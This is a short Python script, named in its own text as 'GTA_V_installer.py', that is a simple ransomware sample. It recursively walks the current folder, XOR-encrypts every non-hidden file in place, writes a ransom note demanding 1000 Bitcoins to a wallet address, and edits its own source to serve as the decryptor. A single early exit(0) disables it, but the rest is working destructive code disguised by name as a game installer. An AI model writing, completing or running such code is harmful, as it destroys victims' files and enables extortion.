#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)
 
    # calculate length of input string
    length = len(inpDataBytes)
 
    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    # Pour éviter une fausse manip genante
    exit(0)
    
    # list all the files in the main folder, and its subfolders
    #list_of_files = [main_folder + f for f in os.listdir(main_folder) if os.path.isfile(main_folder + f) and not f.startswith('.')]
    list_of_files = []
    for root, dirs, files in os.walk(main_folder):
        for file in files:
            if not '/.' in os.path.join(root, file):
                # get the file name
                list_of_files.append(os.path.join(root, file))
    print(list_of_files)
    print("\n")

    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")

    for file in list_of_files:
        if "GTA_V_installer.py" not in file:
            with open(file, 'rb') as f:
                data = bytearray(f.read())
                print("data : " + str(data) + "\n")
                encrypted_data = encryptDecrypt(data)
                print("encrypted : " + str(encrypted_data) + "\n")
            with open(file, 'wb') as f:
                f.write(encrypted_data)

    # Create a READ_TO_RETRIEVE_YOUR_DATA.txt file
    with open(main_folder + "READ_TO_RETRIEVE_YOUR_DATA.txt", 'w') as f:
        f.write("Your PC is now encrypted.\nThe only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Add a message to the Bitcoin transfer with your email address.\nThe code to decrypt your data will be sent automatically to this email.\n")
        f.write("Once you get this code, simply run \"python GTA_V_installer.py\" and input your code.\n")
        f.write("I'm very sorry for the inconvenience. I need to feed my family.\n")
        f.write("HODL.\n")

    # I replace the line where the key is defined, that way I can use the same script for decryption without leaving any trace of the key
    is_edited = False
    for line in fileinput.input("./GTA_V_installer.py", inplace=1):
        if "xorKey = " in line and not is_edited:
            line = "    xorKey = input(\"Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: \")\n"
            is_edited = True
        sys.stdout.write(line)
